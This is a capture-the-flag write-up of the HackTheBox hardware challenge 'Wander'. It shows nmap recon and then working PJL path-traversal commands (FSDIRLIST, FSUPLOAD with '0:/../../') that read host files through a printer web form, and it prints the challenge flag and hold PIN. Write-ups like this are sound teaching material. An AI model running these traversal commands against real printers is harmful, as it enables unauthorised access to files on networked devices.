---
title: "Hardware - wander"
date: 2026-05-10
tags: ["HackTheBox", "Hardware"]
categories: ["Machines&Challenges"]
author: "z3r0s"
---
# Hardware Challenge: Wander

## Target

- `154.57.164.83:31454`

## Summary

The exposed service is a Flask/Werkzeug web app that forwards user-supplied PJL commands to the printer backend.  
The `/jobs` page exposes a form with the placeholder `@PJL INFO ID`, which is enough to identify the intended attack surface: raw Printer Job Language.

By abusing PJL filesystem commands with path traversal, it is possible to escape the printer's virtual root and read files from the underlying host filesystem. The interesting file was `/home/default/readyjob`, which contained both the printer hold PIN and the flag.

## Recon

`nmap` showed the service was HTTP on a Python/Werkzeug stack:

```bash
nmap -Pn -sV -p 31454 154.57.164.83
```

Result:

```text
31454/tcp open  http    Werkzeug httpd 2.0.1 (Python 3.7.11)
```

Browsing the app showed a `Job Controls` page that submits raw PJL to `/printer`.

Baseline check:

```text
@PJL INFO ID
```

Response:

```text
HTB Printer
```

## Exploitation

The key issue is that PJL filesystem access allows traversal outside the printer root when using forward slashes.

List the printer root:

```text
@PJL FSDIRLIST NAME="0:/" ENTRY=1 COUNT=20
```

Response:

```text
. TYPE=DIR
.. TYPE=DIR
PJL TYPE=DIR
PostScript TYPE=DIR
saveDevice TYPE=DIR
webServer TYPE=DIR
```

Traverse upward:

```text
@PJL FSDIRLIST NAME="0:/../" ENTRY=1 COUNT=50
```

Response:

```text
. TYPE=DIR
.. TYPE=DIR
etc TYPE=DIR
conf TYPE=DIR
home TYPE=DIR
rw TYPE=DIR
tmp TYPE=DIR
csr_misc TYPE=DIR
printer TYPE=DIR
```

Navigate to the default user's home:

```text
@PJL FSDIRLIST NAME="0:/../../home/default/" ENTRY=1 COUNT=20
```

Response:

```text
. TYPE=DIR
.. TYPE=DIR
readyjob TYPE=FILE SIZE=457
```

Read the file:

```text
@PJL FSUPLOAD NAME="0:/../../home/default/readyjob" OFFSET=0 SIZE=457
```

Response:

```text
%-12345X@PJL
@PJL COMMENT FLAG = "HTB{w4lk_4nd_w0nd3r}"
@PJL JOB NAME = "JetDirect Boot Job"
@PJL SET USERNAME="default"
@PJL SET HOLDKEY="8214"
...
```

## Results

- Printer PIN: `8214`
- Flag: `HTB{w4lk_4nd_w0nd3r}`

## Notes

I used a small helper script in the workspace to submit PJL commands through the web form:

```bash
./probe_pjl.sh '@PJL FSUPLOAD NAME="0:/../../home/default/readyjob" OFFSET=0 SIZE=457'
```
